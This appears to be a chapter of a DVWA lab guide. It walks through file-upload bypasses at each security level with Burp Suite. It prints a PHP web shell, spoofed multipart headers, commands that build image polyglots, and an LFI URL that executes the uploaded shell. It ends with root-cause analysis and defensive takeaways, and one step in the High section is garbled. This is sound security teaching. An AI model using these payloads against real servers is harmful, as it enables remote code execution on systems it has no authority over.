# Chapter 05 — File Upload (DVWA Module: File Upload)

## Objective
Upload a malicious PHP web shell disguised as an image, then execute it, bypassing client- and server-side filters using Burp Repeater.

## Prerequisites
- Target: `http://localhost/dvwa/vulnerabilities/upload/`
- A PHP web shell payload:
  ```php
  <?php system($_GET['cmd']); ?>
  ```
  Save as `shell.php` locally.

---

## 🟢 LOW

### Source logic
```php
$target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/" . basename( $_FILES['uploaded']['name'] );
if( move_uploaded_file( $_FILES['uploaded']['tmp_name'], $target_path ) ) {
    // success, no type/extension check
}
```
No file-type validation at all.

### Burp Suite steps
1. Use the upload form to select `shell.php`, capture the multipart POST in Proxy, send to Repeater.
2. (Optional) Observe raw multipart body:
   ```
   Content-Disposition: form-data; name="uploaded"; filename="shell.php"
   Content-Type: application/octet-stream

   <?php system($_GET['cmd']); ?>
   ```
3. Send — response confirms upload path, e.g. `hackable/uploads/shell.php`.
4. Trigger it: browse to
   `http://localhost/dvwa/hackable/uploads/shell.php?cmd=id`
   and observe command output.

### Why it works
The server trusts the client-supplied filename/extension implicitly and places the file inside a web-accessible, PHP-executable directory.

---

## 🟡 MEDIUM

### Source logic
```php
$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) && ( $uploaded_size < 100000 ) ) {
    move_uploaded_file(...);
}
```
Checks the **client-supplied** `Content-Type` MIME header and file size — both fully attacker-controlled.

### Burp Suite bypass
1. Upload `shell.php` normally (browser sets `Content-Type: application/octet-stream`), capture in Proxy before it's sent, send to Repeater.
2. In Repeater, edit the multipart body's `Content-Type` header for that file part:
   ```
   Content-Disposition: form-data; name="uploaded"; filename="shell.php"
   Content-Type: image/png
   ```
3. Keep the actual PHP payload as the file content — extension stays `.php`.
4. Send — passes the MIME check since only the client-declared header (which Burp lets you freely edit) is validated, not the real file content.
5. Access `hackable/uploads/shell.php?cmd=id` again — still executes.

### Why the bypass works
`$_FILES['uploaded']['type']` is derived from the HTTP request's `Content-Type` field sent by the client — trivially spoofable with any interception proxy. It has no relation to the file's actual binary content or extension.

---

## 🔴 HIGH

### Source logic
```php
$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" )
    && ( $uploaded_size < 100000 ) ) {
    // also verifies actual image dimensions via getimagesize()
    if (!getimagesize($uploaded_tmp)) { die('Invalid image'); }
    move_uploaded_file(...);
}
```
Checks file **extension** AND validates it's a real image via `getimagesize()` (reads image header structure).

### Burp Suite bypass — PHP/GIF Polyglot
1. Craft a polyglot file that is a **valid image AND valid PHP**: prepend a real GIF header, then append PHP code, keep a `.php` extension won't pass the extension check — instead, rename to `.php` is blocked, so the classic technique is **double extension** or **null-byte** (legacy PHP) or embedding payload inside an image and pairing with a *separate* LFI vulnerability to execute it.
   ```bash
   echo -ne 'GIF89a;\n<?php system($_GET["cmd"]); ?>' > shell.gif.php
   ```
   or craft a true polyglot:
   ```bash
   copy /b legit.jpg + shell.php shell.jpg     # Windows
   cat legit.jpg shell.php > shell.jpg          # Linux — still has .jpg extension so it WON'T be served as PHP by itself
   ```
2. Since Apache executes based on **extension**, a `.jpg` won't run as PHP on its own — pair this upload with the **File Inclusion (Chapter 04)** vulnerability: upload `shell.jpg` (passes `getimagesize()` because it starts with valid GIF/JPEG bytes), then use LFI to `include()` it, since `include()` executes PHP code found anywhere inside an included file regardless of its extension.
   ```
   http://localhost/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.jpg&cmd=id
   ```
3. In Burp, edit the multipart body to prepend valid GIF magic bytes (`GIF89a;`) before your PHP payload so `getimagesize()` succeeds, while keeping extension `.jpg`.

### Why it's still risky
Extension + `getimagesize()` checks validate *file format*, not *the absence of embedded PHP code*. Combined with any secondary include/LFI weakness, a "harmless" image can still achieve code execution — proving upload security can't be evaluated in isolation from the rest of the app.

---

## ⚪ IMPOSSIBLE

### Source logic
```php
// Uses getimagesize() AND re-encodes the image (strips any appended payload)
// Renames the file to a random, non-attacker-controlled name
// Restricts upload directory permissions (no PHP execution allowed there, e.g. via .htaccess)
// Requires CSRF token
$target_file = $target_path . md5( uniqid() ) . '.' . $uploaded_ext;
```

### Why the attack fails
- Random server-generated filenames remove attacker control over naming/extension pairing tricks.
- Re-processing/re-encoding the image (e.g., via `imagecreatefromjpeg()` + `imagejpeg()`) strips any non-image bytes appended by an attacker, destroying embedded PHP payloads.
- The uploads directory can be configured (via `.htaccess`/web server config) to **never execute scripts**, regardless of extension — defense in depth.

### Burp Suite exercise
Attempt the polyglot + LFI combo from High — the re-encoded file on disk no longer contains your PHP payload bytes at all; `cmd=id` returns nothing executable.

---

## Root Cause Analysis
Insecure file upload arises from trusting attacker-controlled metadata (filename, MIME type, extension) as a proxy for file *safety*, and from serving uploaded content from a directory where the web server will execute scripts. Robust fixes combine content validation, re-encoding, randomized naming, and execution-disabled storage.

## Defensive Takeaways
- Never trust `Content-Type` or file extension alone.
- Validate actual file content (magic bytes, re-encode images).
- Store uploads outside the webroot, or in a directory with script execution disabled.
- Rename uploaded files to random, non-guessable names.
- Enforce strict size limits and antivirus/malware scanning where applicable.

---
⬅ [Back: File Inclusion](04-file-inclusion.md) | ➡ [Next: Insecure CAPTCHA](06-insecure-captcha.md)
